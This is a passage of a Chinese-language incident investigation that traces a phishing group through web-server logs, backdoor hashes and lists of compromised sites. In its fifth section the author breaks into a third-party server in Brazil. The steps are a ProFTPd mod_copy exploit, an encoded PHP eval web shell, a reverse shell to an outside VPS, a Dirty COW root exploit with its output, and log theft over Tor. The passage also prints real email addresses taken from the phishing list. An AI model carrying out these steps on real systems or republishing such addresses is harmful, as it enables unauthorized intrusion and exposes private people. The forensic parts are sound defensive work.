Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)\u0026quot;   4.5.2 网站：zebramedia.al 打包\ntar zcvf /home/vayqpdvg/zebramedia.al/zebramedia.al-www.tar.gz --exclude=/home/vayqpdvg/zebramedia.al/zebramedia.al-www.tar.gz /home/vayqpdvg/zebramedia.al/ tar zcvf /home/vayqpdvg/zebramedia.al/zebramedia.al-log.tar.gz /home/vayqpdvg/logs  下载\nwget http://zebramedia.al/zebramedia.al-log.tar.gz wget http://zebramedia.al/zebramedia.al-www.tar.gz -rw-r--r-- 1 1365 1328 478714 11月 30 21:15 evropakrijuese.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 6463 11月 30 21:15 evropakrijuese.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 1855430 6月 30 2018 ftp.publik.live-ftp_log-Jun-2018.gz -rw-r--r-- 1 1365 1328 7899 11月 27 21:12 ftp.publik.live-ftp_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 22883767 11月 30 21:15 ief.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 67526 11月 30 21:15 ief.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 68187 11月 30 21:15 instadyqan.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 34530 11月 30 21:15 instadyqan.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 35748 11月 30 21:15 pigmentnews.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 7709 11月 28 21:15 pigmentnews.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 129055 11月 30 21:15 publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 14487 11月 30 21:15 publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 88292 11月 30 21:15 zebramedia.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 139759 11月 30 21:15 zebramedia.publik.live-ssl_log-Nov-2018.gz -rw-r--r-- 1 1365 1328 6047261 11月 30 21:15 zeri-popullit.publik.live-Nov-2018.gz -rw-r--r-- 1 1365 1328 52004 11月 30 21:15 zeri-popullit.publik.live-ssl_log-Nov-2018.gz  分析\n根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。 ⚡ root@kali  /tmp/zebramedia.al/log/home/vayqpdvg/logs  grep \u0026quot;INSTALL.sql.txt.php\u0026quot; * |grep \u0026quot;php\u0026quot; | awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort |uniq 148 197.211.61.82 (尼日利亚) 8 178.128.221.199 （希腊） ⚡ root@kali  /tmp/zebramedia.al/log/home/vayqpdvg/logs  grep \u0026quot;INSTALL.sql.txt.php\u0026quot; * | grep \u0026quot;php\u0026quot; |grep \u0026quot;POST\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $2 $6}' |sort |uniq 178.128.221.199 - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\u0026quot; 197.211.61.82 - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot;   4.5.2 网站：helioncomposites.com 打包\n日志路径: /home2/helionco/access-logs/helioncomposites.com/ 日志备份: ls /home2/helionco/logs/ ftp.helioncomposites.com-ftp_log-Feb-2018.gz\thelioncomposites.com-Dec-2018.gz\thelioncomposites.com-Nov-2018.gz\thelioncomposites.com-ssl_log-Dec-2018.gz\thelioncomposites.com-ssl_log-Nov-2018.gz\ttar zcvf /home2/helionco/www/helioncomposites.com-www.tar.gz --exclude=/home2/helionco/www/helioncomposites.com-www.tar.gz /home2/helionco/www/ tar zcvf /home2/helionco/www/helioncomposites.com-log.tar.gz /home2/helionco/logs/ /home2/helionco/access-logs/helioncomposites.com/  下载\nwget http://helioncomposites.com/helioncomposites.com-log.tar.gz wget http://helioncomposites.com/helioncomposites.com-www.tar.gz  分析\n根据后门文件名，匹配Apache访问日志，到攻击者代理IP和User Agent。 ⚡ root@kali  /tmp  grep \u0026quot;.php\u0026quot; * |grep \u0026quot;/home2/helionco/public_html/\u0026quot; |grep \u0026quot;HTTP\\/1.1\\\u0026quot; 200\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort -t \u0026quot; \u0026quot; -k 1 -n -r \u0026gt;ip.txt 1137 198.143.51.17 588 198.143.38.3 478 198.143.41.14 246 198.143.32.13 131 198.143.32.3 103 198.143.57.3 86 198.143.57.73 84 198.143.57.5 46 198.143.32.10 32 198.143.37.15 ...... ⚡ root@kali  /tmp  for line in $(\u0026lt;/ip.txt); do curl https://ip.cn/\\?ip\\=$line ; done IP: 198.143.51.17 来自: 以色列 Incapsula IP: 198.143.38.3 来自: 美国 Incapsula IP: 198.143.41.14 来自: 美国 Incapsula IP: 198.143.32.13 来自: 美国 Incapsula IP: 198.143.32.3 来自: 美国 Incapsula IP: 198.143.57.3 来自: 美国 Incapsula IP: 198.143.57.73 来自: 美国 Incapsula IP: 198.143.57.5 来自: 美国 Incapsula IP: 198.143.32.10 来自: 美国 Incapsula ......   这个网站由于日志不全，提取出的IP大都是爬虫IP，所以不纳入最终的汇总。\n  4.5.3 发现钓鱼程序 网站　zebramedia.al　上发现多个攻击者放置的钓鱼程序和模板。\n针对Dropbox\n针对Gmail\n 4.6 关联分析 使用之前得到的后门文件中的关键字（config.php）对这3个网站文件进行匹配，发现其中2个存在相同后门文件，并且文件MD5值相同。\n ⚡ root@kali  /tmp  find . -name \u0026quot;*.php\u0026quot; |xargs grep \u0026quot;\\$bm_____s\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $1}' ./rosturplast.com/www/rosturplast.com/shells/config.php ./mirohaviar.sk/www/config.php ./zebramedia.al/www/zebramedia.al/config.php ./www.radiolanalhue.cl/www/public_html/online/administrator/templates/bluestork/config.php  后门文件MD5\n ⚡ root@kali  /tmp  find . -name \u0026quot;*.php\u0026quot; |xargs grep \u0026quot;\\$bm_____s\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $1}' |xargs md5sum e5c06f1f66781ba5c39d909096c4cd47 ./rosturplast.com/www/rosturplast.com/shells/config.php e5c06f1f66781ba5c39d909096c4cd47 ./mirohaviar.sk/www/config.php e5c06f1f66781ba5c39d909096c4cd47 ./zebramedia.al/www/zebramedia.al/config.php e5c06f1f66781ba5c39d909096c4cd47 ./www.radiolanalhue.cl/www/public_html/online/administrator/templates/bluestork/config.php   五、渗透攻击者傀儡服务器 5.1 漏洞扫描 目标：187.85.134.4\n [+] HOST: 187.85.134.4（巴西）\n[+] OS: Ubuntu [+] Web Server: Apache/2.2.22 / PHP/5.3.10-1ubuntu3.19\n[+] CMS: 未知\n nmap --script=firewalk --traceroute 187.85.134.4  5.２ 漏洞利用 端口扫描发现目标 FTP Server为ProFTPd 1.3.4a，这个版本和1.3.5存在未授权文件复制漏洞，我们可以通过这个漏洞往Web目录写入一个WebShell。\nProFTPd 1.3.5 Remote Command Execution（CVE-2015-3306） ProFTPD中使用的mod_copy模块存在未授权访问风险，导致ProFTPD自带的命令 SITE CPFR 和 SITE CPTO可在未登录ftp的情况被外部黑客所利用，对系统文件进行任意复制。  5.２ 获取权限 使用用MSF执行\n得到一个cmd功能的WebShell\n写入中国菜刀客户端\nhttp://187.85.134.4/lndex.php?img=echo PD9waHAgQGV2YWwoJF9QT1NUWydhJ10pOz8+Cg== |base64 -d \u0026gt;/var/www/index2.php  5.3 文件分析 在Web目录下面发现用于发送钓鱼邮件的perl脚本、邮件钓鱼样本和大量的邮箱地址。以及挖矿后门、DDOS脚本等。\n5.3.1 钓鱼模板 图示是针对丹麦丹斯克银行（Danske Bank）和希腊阿尔法银行（Alpha Bank）的邮件钓鱼样本。\n5.3.2 僵尸网络程序 5.3.3 DDOS脚本 5.3.4 邮箱地址  统计目录下的 txt 文本数量，发现共有六十二万四千个邮箱地址。\n  ⚡ root@kali  /tmp/187.85.134.4/www/cat  wc -l *.txt 624000 总用量  主流邮箱检索\n ⚡ root@kali  /tmp/187.85.134.4/www/cacat  grep \u0026quot;@gmail.com\u0026quot; *.txt |head -n 20 a0000001.txt:a.l.v.e.rtadsmileyksso@gmail.com a0000001.txt:a.l.v.ertadsmileyksso@gmail.com a0000001.txt:a.lfer.gm@gmail.com a0000001.txt:a.lieseijsink@gmail.com a0000001.txt:a.linkhusen@gmail.com a0000001.txt:a.loldrup@gmail.com a0000001.txt:a.lovendahl@gmail.com a0000001.txt:a.lv.e.rtadsmileyksso@gmail.com a0000001.txt:a.lver.tadsmileyksso@gmail.com a0000001.txt:a.m.edsberg@gmail.com a0000001.txt:a.m.morcke@gmail.com a0000001.txt:a.m.quist@gmail.com a0000001.txt:a.m.svendsen@gmail.com a0000001.txt:a.merete.p@gmail.com a0000001.txt:a.mette.sm@gmail.com a0000001.txt:a.miller8111@gmail.com a0000001.txt:a.moejbaek@gmail.com a0000001.txt:a.moltkehansen@gmail.com a0000001.txt:a.munktved@gmail.com a0000001.txt:a.n.knutzen@gmail.com ⚡ root@kali  /tmp/187.85.134.4/www/cat  grep \u0026quot;@outlook.com\u0026quot; *.txt |head -n 20 a0000001.txt:a.m.westra@outlook.com a0000001.txt:a.olsen@outlook.com a0000002.txt:aagren@outlook.com a0000003.txt:aandanimalcity@outlook.com a0000003.txt:aarhus-ungegruppe@outlook.com a0000004.txt:aase.lousdal@outlook.com a0000006.txt:abroschultz@outlook.com a0000008.txt:adamfred2@outlook.com a0000008.txt:adexecsolution@outlook.com a0000010.txt:adrian.f.a.svendsen@outlook.com a0000015.txt:aiah@outlook.com a0000015.txt:aimeegarcia584@outlook.com a0000016.txt:ajolicoeu@outlook.com a0000018.txt:akstrup@outlook.com a0000020.txt:alexander_bangsborg@outlook.com a0000020.txt:alexanderkopke@outlook.com a0000020.txt:ali__sivan@outlook.com a0000021.txt:alicegerner@outlook.com a0000022.txt:allanjeppesen@outlook.com a0000023.txt:allworlduseu@outlook.com ⚡ root@kali  /tmp/187.85.134.4/www/cat  grep \u0026quot;@163.com\u0026quot; *.txt |head -n 20 a0000001.txt:a31a18615@163.com a0000001.txt:a398c671@163.com a0000059.txt:backlink0321@163.com a0000061.txt:banqianm8256@163.com a0000075.txt:bf86ad32@163.com a0000121.txt:cbb146672@163.com a0000129.txt:chenbin800519@163.com a0000134.txt:chuofuh3082@163.com a0000157.txt:davidhuang001@163.com a0000162.txt:dfjiuew@163.com a0000209.txt:f08dbf326@163.com a0000213.txt:fanxued79193@163.com a0000221.txt:fjfzpy@163.com a0000227.txt:fon@163.com a0000259.txt:guangdk@163.com a0000311.txt:huhuanqiang00161@163.com  5.4 提权 5.4.1 CVE-2013-2094，CVE-2013-1763提权 查看apache日志目录，发现没有权限。\n[/var/www/]$ls -al /var/log/apache2/ ls: cannot open directory /var/log/apache2/: Permission denied  内核版本为3.5.0-23，尝试提权。\n[/var/www/]$cat /etc/issue Ubuntu 12.04.2 LTS \\n \\l [/var/www/]$uname -an Linux medidor2 3.5.0-23-generic #35~precise1-Ubuntu SMP Fri Jan 25 17:15:33 UTC 2013 GNU/Linux  WebShell反弹： [/var/www/]$cd /var/tmp;./pty xxx.xxx.xxx.xxx 443 外网VPS监听： socat file:`tty`,echo=0,raw tcp-listen:443  实际测试CVE-2013-2094，CVE-2013-1763均无法提权。\nCVE-2013-2094 Linux Kernel 3.2.0-23/3.5.0-23 (Ubuntu 12.04/12.04.1/12.04.2 x64) - 'perf_swevent_init' Local Privilege Escalation (3) CVE-2013-1763 Linux Kernel \u0026lt; 3.5.0-23 (Ubuntu 12.04.2 x64) - 'SOCK_DIAG' SMEP Bypass Local Privilege Escalation  5.4.2 脏牛提权 祭出大杀器CVE-2016-5195（脏牛） ， 理论上通杀 2.6.22 \u0026lt; 3.9 (x86/x64)的内核版本。\n 在本地环境提权测试过程中发现，i386架构下使用cowroot提权时EXP会破坏源文件，导致提权失败。而使用dirtycow-mem仅修改内存则没有问题，但是存在内核崩溃的风险。这两个EXP都是利用/proc/self/mem提权，前一个修改文件，后一个修改内存。\n 如图所示：\n使用dirtycow-mem.c提权时需要注意：i386架构下编译前需要将源代码中libc路径修改为目标系统libc路径，否则执行时找不到文件。\n#define SHELLCODE\t\u0026quot;\\x31\\xc0\\xc3\u0026quot; #define SPACE_SIZE\t256 #define LIBC_PATH\t\u0026quot;/lib/x86_64-linux-gnu/libc.so.6\u0026quot; ## 改为　/lib/i386-linux-gnu/libc.so.6 #define LOOP\t0x1000000 #ifndef PAGE_SIZE #define PAGE_SIZE 4096  Give me root :），提权成功。\nwww-data@medidor2:/tmp$gcc -Wall -o hello dirtycow-mem.c -ldl -lpthread www-data@medidor2:/tmp$ ls hello www-data@medidor2:/tmp$ chmod +x hello www-data@medidor2:/tmp$ id uid=33(www-data) gid=33(www-data) groups=33(www-data) www-data@medidor2:/tmp$ ./hello [*] range: b7573000-b7716000] [*] getuid = b762bd10 [*] mmap 0xb73cb000 [*] exploiting (patch) [*] patched (madviseThread) [*] patched (procselfmemThread) root@medidor2:/tmp# [*] exploiting (unpatch) [*] unpatched: uid=33 (madviseThread) [*] unpatched: uid=33 (procselfmemThread) root@medidor2:/tmp# id uid=0(root) gid=0(root) groups=0(root)  打包Apache日志。\n✘ ⚡ root@kali  ls /var/log/apache2 access error other_vhosts_access.log ✘ ⚡ root@kali  tar zcvf /var/www/apache2-log.tar.gz /var/log/apache2/ ✘ ⚡ root@kali  /tmp  ltor wget http://187.85.134.4/apache2-log.tar.gz [proxychains] config file found: /data/app/local/proxychains_local_tor/proxychains.conf [proxychains] preloading /data/app/local/proxychains_local_tor/libproxychains4.so [proxychains] DLL init --2011-11-11 11:11:11-- http://187.85.134.4/apache2-log.tar.gz 正在连接 187.85.134.4:80... [proxychains] Strict chain ... 127.0.0.1:9050 ... 187.85.134.4:80 ... OK 已连接。 已发出 HTTP 请求，正在等待回应... 200 OK 长度：9258688 (8.8M) [application/x-gzip] 正在保存至: “apache2-log.tar.gz” apache2-log.tar.gz 100%[===================\u0026gt;] 8.83M 29.6KB/s 用时 5m 45s 2018-11-11 11:11:11 (26.2 KB/s) - 已保存 “apache2-log.tar.gz” [9258688/9258688])  5.5 分析日志 分析IP访问情况\n⚡ root@kali  /tmp/  grep \u0026quot;/cacat/\u0026quot; * |grep \u0026quot;php\u0026quot; | awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort -t \u0026quot; \u0026quot; -k 1 -n -r \u0026gt;ip.txt 95 185.56.80.138 77 197.211.60.52 70 67.71.3.8 59 207.35.210.35 41 99.226.207.46 41 193.215.40.238 39 197.211.59.163 38 82.61.95.132 38 66.249.73.95 37 76.26.34.181 37 197.234.221.77 31 105.112.27.60 29 105.112.23.41 20 109.166.138.68 16 66.249.79.61 16 197.211.61.18 14 212.100.77.191 12 197.234.221.210 8 66.249.79.35 8 66.249.73.64 7 154.118.69.165 5 66.249.73.67 ...... ⚡ root@kali  /tmp  for line in $(\u0026lt;ip.txt); do curl https://ip.cn/\\?ip\\=$line ; done IP: 185.56.80.138 来自: 荷兰 IP: 197.211.60.52 来自: 尼日利亚 IP: 67.71.3.8 来自: 加拿大 IP: 207.35.210.35 来自: 加拿大 IP: 99.226.207.46 来自: 加拿大 IP: 193.215.40.238 来自: 挪威 IP: 197.211.59.163 来自: 尼日利亚 IP: 82.61.95.132 来自: 意大利 IP: 66.249.73.95 来自: Google 骨干网 IP: 76.26.34.181 来自: 美国 IP: 197.234.221.77 来自: 贝宁 IP: 105.112.27.60 来自: 尼日利亚 IP: 105.112.23.41 来自: 尼日利亚 IP: 109.166.138.68 来自: 罗马尼亚 IP: 66.249.79.61 来自: Google 骨干网 IP: 197.211.61.18 来自: 尼日利亚 IP: 212.100.77.191 来自: 尼日利亚 IP: 197.234.221.210 来自: 贝宁 IP: 66.249.79.35 来自: Google 骨干网 IP: 66.249.73.64 来自: Google 骨干网 IP: 154.118.69.165 来自: 尼日利亚 IP: 66.249.73.67 来自: Google 骨干网 ......  根据路径名判断，疑似受害者访问了钓鱼页面。\n ⚡ root@kali  /tmp/ grep \u0026quot;/cacat\u0026quot; *| grep \u0026quot;php\u0026quot; |grep \u0026quot;POST\u0026quot; |awk -F \u0026quot;:\u0026quot; '{print $2 $6}' |sort |uniq 109.166.138.68 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\u0026quot; 109.166.138.68 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php?sfm_sid=120\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36\u0026quot; 185.56.80.138 - - [31/Jan/2018//187.85.134.4/cacat/portal/portal/userlogin.php?sfm_sid=8425\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\u0026quot; 196.52.34.20 - - [12/Oct/201835.0) Gecko/20100101 Firefox/35.0\u0026quot; 207.35.210.35 - - [21/Aug/2018//187.85.134.4/cacat/win2018/winbnk/EBlogin.html?sitecode=GR\u0026amp;lang=el-GR\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3396.99 Safari/537.36\u0026quot; 197.211.60.52 - - [07/Sep/2018:16:02:40 -0300] \u0026quot;GET /cacat/nnnnn.zip HTTP/1.1\u0026quot; 200 4489167 \u0026quot;http://187.85.134.4/cacat/\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36\u0026quot;  查看web目录下txt文件访问情况，总共有一万多IP。访问地址包含受害者主机IP、各种搜索引擎爬虫IP、各路黑客的IP等等。\ngrep \u0026quot;/cacat/\u0026quot; * |grep \u0026quot;txt\u0026quot; | awk -F \u0026quot;:\u0026quot; '{print $2}' |awk '{a[$1]+=1;} END {for(i in a){print a[i]\u0026quot; \u0026quot;i;}}' |sort -t \u0026quot; \u0026quot; -k 1 -n -r \u0026gt;ip.txt ⚡ root@kali  ~/Desktop  wc -l ip.txt 10101 ip.txt  5.6 访问IP热力图 5.6.1 IP转经纬度坐标 将获得的IP转换成经纬度坐标，再通过百度地图API生成热力图\n 将IP转换成经纬度坐标，脚本：ip2xy.py 生成经纬度坐标文件：point.js 全球IP库：GeoLiteCity.dat\n #!/usr/bin/python #coding:utf-8 import pandas as pd import pygeoip import types import sys gi = pygeoip.GeoIP('/tmp/GeoLiteCity.dat', pygeoip.MEMORY_CACHE) def getLocal(ip): if type(ip) != types.StringType: print ip return location = gi.record_by_addr(ip) if location is None: print ip return lng = location['longitude'] lat = location['latitude'] str_temp = '{\u0026quot;lat\u0026quot;:' + str(lat) + ',\u0026quot;lng\u0026quot;:' + str(lng) + '},\\n' print ip,lng,lat,str_temp file.write(str_temp) file = open('/tmp/point.js', 'w') file.write(\u0026quot;var points =[\\n\u0026quot;) with open(\u0026quot;/tmp/ip.txt\u0026quot;) as f: i = 0 for ip in f.readlines(): getLocal(ip) file.write(\u0026quot;];\\n\u0026quot;) file.close()  5.6.2 调用百度地图API 本地调用百度地图 JavaScript API： map.html\n\u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html lang=\u0026quot;en\u0026quot;\u0026gt; \u0026lt;head\u0026gt; \u0026lt;!DOCTYPE html\u0026gt; \u0026lt;html\u0026gt; \u0026lt;head\u0026gt; \u0026lt;meta http-equiv=\u0026quot;Content-Type\u0026quot; content=\u0026quot;text/html; charset=utf-8\u0026quot; /\u0026gt; \u0026lt;meta name=\u0026quot;viewport\u0026quot; content=\u0026quot;initial-scale=1.0, user-scalable=no\u0026quot; /\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;http://api.map.baidu.com/api?v=2.0\u0026amp;ak=填写自己的百度AK\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;http://api.map.baidu.com/library/Heatmap/2.0/src/Heatmap_min.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot; src=\u0026quot;./point.js\u0026quot;\u0026gt;\u0026lt;/script\u0026gt; \u0026lt;title\u0026gt;热力图功能示例\u0026lt;/title\u0026gt; \u0026lt;style type=\u0026quot;text/css\u0026quot;\u0026gt; ul,li{list-style: none;margin:0;padding:0;float:left;} html{height:100%} body{height:100%;margin:0px;padding:0px;font-family:\u0026quot;微软雅黑\u0026quot;;} #container{height:100%;width:100%;} #r-result{width:100%;} \u0026lt;/style\u0026gt; \u0026lt;/head\u0026gt; \u0026lt;body\u0026gt; \u0026lt;div id=\u0026quot;container\u0026quot;\u0026gt;\u0026lt;/div\u0026gt; \u0026lt;div id=\u0026quot;r-result\u0026quot; style=\u0026quot;display:none\u0026quot;\u0026gt; \u0026lt;input type=\u0026quot;button\u0026quot; onclick=\u0026quot;openHeatmap();\u0026quot; value=\u0026quot;显示热力图\u0026quot;/\u0026gt;\u0026lt;input type=\u0026quot;button\u0026quot; onclick=\u0026quot;closeHeatmap();\u0026quot; value=\u0026quot;关闭热力图\u0026quot;/\u0026gt; \u0026lt;/div\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt; \u0026lt;script type=\u0026quot;text/javascript\u0026quot;\u0026gt; var map = new BMap.Map(\u0026quot;container\u0026quot;); // 创建地图实例 var point = new BMap.Point(34.0224714118,109.0786868715); map.centerAndZoom(point, 6); // 初始化地图，设置中心点坐标和地图级别 map.setCurrentCity(\u0026quot;西安\u0026quot;);\t//设置当前显示城市 map.enableScrollWheelZoom(); // 允许滚轮缩放 if(!isSupportCanvas()){ alert('热力图目前只支持有canvas支持的浏览器,您所使用的浏览器不能使用热力图功能~') } //详细的参数,可以查看heatmap.js的文档 https://github.com/pa7/heatmap.js/blob/master/README.md //参数说明如下: /* visible 热力图是否显示,默认为true * opacity 热力的透明度,1-100 * radius 势力图的每个点的半径大小 * gradient {JSON} 热力图的渐变区间 . gradient如下所示 * { .2:'rgb(0, 255, 255)', .5:'rgb(0, 110, 255)', .8:'rgb(100, 0, 255)' } 其中 key 表示插值的位置, 0~1. value 为颜色值. */ heatmapOverlay = new BMapLib.HeatmapOverlay({\u0026quot;radius\u0026quot;:100,\u0026quot;visible\u0026quot;:true}); map.addOverlay(heatmapOverlay); heatmapOverlay.setDataSet({data:points,max:100}); //closeHeatmap(); //判断浏览区是否支持canvas function isSupportCanvas(){ var elem = document.createElement('canvas'); return !!(elem.getContext \u0026amp;\u0026amp; elem.getContext('2d')); } function setGradient(){ /*格式如下所示: { 0:'rgb(102, 255, 0)', .5:'rgb(255, 170, 0)', 1:'rgb(255, 0, 0)' }*/ var gradient = {}; var colors = document.querySelectorAll(\u0026quot;input[type='color']\u0026quot;); colors = [].slice.call(colors,0); colors.forEach(function(ele){ gradient[ele.getAttribute(\u0026quot;data-key\u0026quot;)] = ele.value; }); heatmapOverlay.setOptions({\u0026quot;gradient\u0026quot;:gradient}); } function openHeatmap(){ heatmapOverlay.show(); } function closeHeatmap(){ heatmapOverlay.hide(); } \u0026lt;/script\u0026gt; \u0026lt;/body\u0026gt; \u0026lt;/html\u0026gt;  5.6.3 生成热力图 如图所示，欧洲IP居多，亚洲也不少。至于有多少主机沦陷和多少受害者上钩，无法准确判断。\n   六、信息汇总 根据所得信息汇总，对这个黑客组织信息进行简单分析，仅供参考。\n6.1 组织信息  名称：\n Muslim Cyber Corp - Mujahidin Cyber Army - Family Attack Cyber\n 地区：\n 巴勒斯坦\n 成员ID：\n Hawk_B404 、 MR.S1NS_Y 、 koneksi eror 、 GU3LT03M 、 SinonX 、 ./B4Z1R007 、 ./Bl4ckJ4ck 、 anon99husein 、 4GottenName 、Gantai 、 4nzeL4 、 AKEMI403\n 历史邮箱：\n alexsin54@yahoo.com jasonchowan223@gmail.com macacperus@yopmail.com bidibidibidi@yopmail.com bidi.pici11@hotmail.com bidi.cuc@mail.com flrnvasilica@gmail.com\n 组织主页：\n http://mujahidincyberarmy.blogspot.com/ https://www.facebook.com/FamilyAttackCyberOfficial/\n  6.2 攻击手段   入侵使用Wordpress、Joomla! CMS的网站、放置钓鱼程序，批量传播钓鱼邮件。\n 攻击目标：\n 早期政治目的居多，主要攻击美国政府机构网站和雇员。近期多为商业目的，主要针对欧洲银行客户以及亚洲金融机构雇员进行邮件钓鱼。\n 控制主机：\n 187.85.134.4\n 常用后门：\n 略\n  6.3 攻击历史  美国联邦调查局、美国国土安全部、美国司法部\n 巴勒斯坦黑客已经发布了大约2万名联邦调查局（FBI）和9,000名国土安全部（DHS）官员的个人信息 http://mujahidincyberarmy.blogspot.com/2016/12/inilah-data-informasi-pribadi-20-ribu.html\n  通过钓鱼邮件获得美国司法部权限 http://mujahidincyberarmy.blogspot.com/2016/02/hacker-pro-palestina-terbitkan.html\n  6.4 代理IP 174.85.145.99 (美国) - - [27/Nov/2018:23:35:31 +0300] \u0026quot;POST /shells/bacu.php HTTP/1.1\u0026quot; 200 4731 \u0026quot;http://www.rosturplast.com/shells/bacu.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 50.73.252.169 (美国) - - [29/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 213.233.104.120 (罗马尼亚) - - [27/Nov/2018:22:10:03 +0300] \u0026quot;GET /shells/config.php HTTP/1.1\u0026quot; 200 124 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64; rv:63.0) Gecko/20100101 Firefox/63.0\u0026quot; 207.228.149.69 (百慕大 ) - - [28/Nov/2018:23:12:54 +0300] \u0026quot;POST /shells/config.php HTTP/1.1\u0026quot; 200 3729 \u0026quot;http://www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot; 195.211.23.207 (俄罗斯) - - [27/Nov/2018:22:36:50 +0300] \u0026quot;GET /shells/config.php HTTP/1.1\u0026quot; 200 124 \u0026quot;-\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.2; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36\u0026quot; 29.205.113.8 (尼日利亚) - - [30/Nov/2018//www.rosturplast.com/shells/config.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36\u0026quot; 212.1.211.3 （美国） - - [30/Nov/2018:13:35:36 -0300] \u0026quot;GET /online/templates/beez5/bc.php HTTP/1.1\u0026quot; 200 16823 \u0026quot;-\u0026quot; \u0026quot;Mozilla/4.0 (compatible; MSIE 5.01; Windows NT 5.0)\u0026quot; 178.128.221.199 （希腊）- - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/62.0.3202.94 Safari/537.36\u0026quot; 197.211.61.82 （尼日利亚) - - [29/Nov/2018//www.zebramedia.al/wp-content/themes/shells/INSTALL.sql.txt.php\u0026quot; \u0026quot;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36\u0026quot;  6.5 被黑网站 不完全统计 rosturplast.com mirohaviar.sk helioncomposites.com radiolanalhue.cl zebramedia.al www.qtfontebispo.com www.seoeaze.com vilapoucadeaguiar.com proyectosphr.cl u-p.com www.humanaconsultores.cl amsogroup.com www.tdftechnologies.com www.bvvagos.pt www.huellasdigitales.cl lince.apsl.edu.pl www.fica.unsl.edu.ar proyectosphr.cl www.zlobek.uw.edu.pl ifr.pt mail.ijrer.org www.hkmms.org.hk historia.apsl.edu.pl www.homeguide.com.sg onlinecombos.co.in umo.apsl.edu.pl www.bpmp2t.lombokbaratkab.go.id amsogroup.com viper.cl www.teniscavancha.cl www.estacaomedica.pt terrarestobar.cl jf-bragado.pt helioncomposites.com notariabasualto.cl ericdiblasi.com reinamarltda.cl cobraz.pt www.stmarypellaia.com webcam.wm-itservice.at   七、攻击路径还原 